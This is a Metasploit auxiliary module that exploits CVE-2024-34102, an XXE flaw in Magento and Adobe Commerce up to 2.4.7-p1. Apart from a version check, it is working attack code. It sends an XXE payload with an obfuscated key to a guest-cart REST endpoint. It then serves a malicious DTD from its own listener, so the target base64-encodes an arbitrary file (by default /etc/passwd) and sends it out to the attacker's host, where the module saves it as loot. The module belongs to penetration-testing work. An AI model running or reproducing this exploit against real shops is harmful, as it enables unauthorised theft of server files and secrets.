##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  prepend Msf::Exploit::Remote::AutoCheck
  # APSB24-40 fixed releases from https://helpx.adobe.com/security/products/magento/apsb24-40.html.
  # Each mapped x.y.z branch is affected until its listed fixed patch level. A target on one of
  # these branches that is not yet at fixed_patch is affected by CVE-2024-34102.
  APSB24_40_BRANCHES = {
    '2.4.7' => { fixed_patch: 1 }.freeze,
    '2.4.6' => { fixed_patch: 6 }.freeze,
    '2.4.5' => { fixed_patch: 8 }.freeze,
    '2.4.4' => { fixed_patch: 9 }.freeze
  }.freeze
  # Adobe Commerce is reported by the banner as "Enterprise" and shares the -pN scheme on 2.4.4-2.4.7.
  MAPPED_EDITIONS = %w[Community Enterprise].freeze
  # Adobe Commerce extended support branches, affected up to and including the listed -ext-N level.
  APSB24_40_EXT_BRANCHES = {
    '2.4.3' => { affected_through: 7 }.freeze,
    '2.4.2' => { affected_through: 7 }.freeze
  }.freeze
  MAGENTO_BANNER_PATTERN = %r{\bMagento/([^\s(]+)\s+\(([^)]*)\)}
  # The /magento_version controller only emits major.minor (e.g. "2.4"); a full x.y.z[-pN] is only
  # available from other sources.
  MAGENTO_MINOR_PATTERN = /\A\d+\.\d+\z/
  MAGENTO_VERSION_PATTERN = /\A(\d+\.\d+\.\d+)(?:-p(\d+))?\z/
  MAGENTO_EXT_VERSION_PATTERN = /\A(\d+\.\d+\.\d+)-ext-(\d+)\z/

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Magento XXE Unserialize Arbitrary File Read',
        'Description' => %q{
          This module exploits a XXE vulnerability in Magento 2.4.7-p1 and below which allows an attacker to read any file on the system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Sergey Temnikov',  # Vulnerability discovery
          'Heyder',           # Metasploit module
        ],

        'References' => [
          ['CVE', '2024-34102'],
          ['URL', 'https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md']
        ],
        'DisclosureDate' => '2024-06-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
      )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to the web application', '/']),
        OptString.new('TARGETFILE', [ true, 'The target file to read', '/etc/passwd']),
        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false])
      ]
    )
  end

  def check
    vprint_status('Trying to get the Magento version')

    # Request to check whether the target identifies itself as Magento.
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/magento_version')
    })

    return Exploit::CheckCode::Unknown('Could not detect the version.') unless res&.code == 200

    body = res.body.to_s
    banner_match = body.match(MAGENTO_BANNER_PATTERN)
    return Exploit::CheckCode::Safe('Target was not identified as Magento') unless banner_match

    version = banner_match[1]
    edition = banner_match[2].strip
    return Exploit::CheckCode::Unknown('Detected Magento banner with insufficient version or edition evidence') if edition.empty?
    return Exploit::CheckCode::Unknown("Detected Magento #{edition} edition version #{version} with insufficient edition mapping evidence") unless MAPPED_EDITIONS.include?(edition)

    case classify_version(version, edition)
    when :unverifiable
      Exploit::CheckCode::Detected("Detected Magento #{edition} edition version #{version}; the patch level cannot be determined from /magento_version")
    when :affected
      Exploit::CheckCode::Appears("Detected Magento #{edition} edition version #{version} which is affected by CVE-2024-34102")
    when :fixed
      Exploit::CheckCode::Safe("Detected Magento #{edition} edition version #{version} which is fixed for CVE-2024-34102")
    else
      Exploit::CheckCode::Unknown("Detected Magento #{edition} edition version #{version} with insufficient version or branch mapping evidence")
    end
  end

  # Classifies a Magento version string against the APSB24-40 advisory.
  #
  # The /magento_version endpoint only returns major.minor (e.g. "2.4"), which is not enough to
  # tell patched releases (or isolated-patch installs) from vulnerable ones.
  #
  # @param version [String] the version component of the Magento banner
  # @param edition [String] the edition component of the Magento banner
  # @return [Symbol] :affected, :fixed, :unverifiable (branch only), or :unknown
  def classify_version(version, edition)
    return :unverifiable if version.match?(MAGENTO_MINOR_PATTERN)

    ext_match = version.match(MAGENTO_EXT_VERSION_PATTERN)
    if ext_match
      ext_release = APSB24_40_EXT_BRANCHES[ext_match[1]]
      return :unknown unless ext_release && edition == 'Enterprise'

      # Levels beyond the last advisory-listed one are not mapped, so don't claim they are fixed.
      return ext_match[2].to_i <= ext_release[:affected_through] ? :affected : :unknown
    end

    version_match = version.match(MAGENTO_VERSION_PATTERN)
    return :unknown unless version_match

    patch = version_match[2]&.to_i
    release = APSB24_40_BRANCHES[version_match[1]]
    return :unknown unless release

    # A base release with no patch suffix (patch.nil?) has not had the APSB24-40 patch applied,
    # so a mapped branch is affected. Below fixed_patch is affected; at or above it is fixed.
    return :affected if patch.nil? || patch < release[:fixed_patch]

    :fixed
  end

  def ent_eval
    @ent_eval ||= Rex::Text.rand_text_alpha_lower(4..8)
  end

  def leak_param_name
    @leak_param_name ||= Rex::Text.rand_text_alpha_lower(4..8)
  end

  def dtd_param_name
    @dtd_param_name ||= Rex::Text.rand_text_alpha_lower(4..8)
  end

  def make_xxe_dtd
    filter_path = "php://filter/convert.base64-encode/resource=#{datastore['TARGETFILE']}"
    ent_file = Rex::Text.rand_text_alpha_lower(4..8)
    %(
      <!ENTITY % #{ent_file} SYSTEM "#{filter_path}">
      <!ENTITY % #{dtd_param_name} "<!ENTITY #{ent_eval} SYSTEM '#{get_uri}/?#{leak_param_name}=%#{ent_file};'>">
    )
  end

  def xxe_xml_data
    param_entity_name = Rex::Text.rand_text_alpha_lower(4..8)

    xml = "<?xml version='1.0' ?>"
    xml += "<!DOCTYPE #{Rex::Text.rand_text_alpha_lower(4..8)}"
    xml += '['
    xml += "  <!ELEMENT #{Rex::Text.rand_text_alpha_lower(4..8)} ANY >"
    xml += "    <!ENTITY % #{param_entity_name} SYSTEM '#{get_uri}/#{Rex::Text.rand_text_alpha_lower(4..8)}.dtd'> %#{param_entity_name}; %#{dtd_param_name}; "
    xml += ']'
    xml += "> <r>&#{ent_eval};</r>"

    xml
  end

  def xxe_request
    vprint_status('Sending XXE request')

    signature = Rex::Text.rand_text_alpha(6).capitalize

    post_data = <<~EOF
      {
        "address": {
        "#{signature}": "#{Rex::Text.rand_text_alpha_lower(4..8)}",
        "totalsCollector": {
          "collectorList": {
          "totalCollector": {
            "\u0073\u006F\u0075\u0072\u0063\u0065\u0044\u0061\u0074\u0061": {
            "data": "#{xxe_xml_data}",
            "options": 12345678
            }
          }
          }
        }
        }
      }
    EOF

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/rest/V1/guest-carts/1/estimate-shipping-methods'),
      'ctype' => 'application/json',
      'data' => post_data
    })

    fail_with(Failure::UnexpectedReply, "Server returned unexpected response: #{res.code}") unless res&.code == 400

    body = res.get_json_document

    fail_with(Failure::UnexpectedReply, 'Server might not be vulnerable') unless body['parameters']['fieldName'] == signature
  end

  def run
    start_service({
      'Uri' => {
        'Proc' => proc do |cli, req|
          on_request_uri(cli, req)
        end,
        'Path' => '/'
      },
      'ssl' => false
    })

    xxe_request
  rescue Timeout::Error => e
    fail_with(Failure::TimeoutExpired, e.message)
  end

  def on_request_uri(cli, req)
    super
    data = ''

    case req.uri
    when /(.*).dtd/
      vprint_status("Received request for DTD file from #{cli.peerhost}")
      data = make_xxe_dtd
    when /#{leak_param_name}/
      data = req.uri_parts['QueryString'].values.first.gsub(/\s/, '+')
      if data&.empty?
        print_error('No data received')
      else

        file_name = datastore['TARGETFILE']
        file_data = ::Base64.decode64(data).force_encoding('UTF-8')

        if datastore['STORE_LOOT']
          p = store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], file_data, file_name, 'Magento XXE CVE-2024-34102 Results')
          print_good("File saved in: #{p}")
        else
          # A new line is sent before file contents for better readability
          print_good("File read succeeded! \n#{file_data}")
        end

      end
    else
      print_status("Unexpected request received: '#{req.method} #{req.uri}'")
    end

    send_response(cli, data)
  end

end
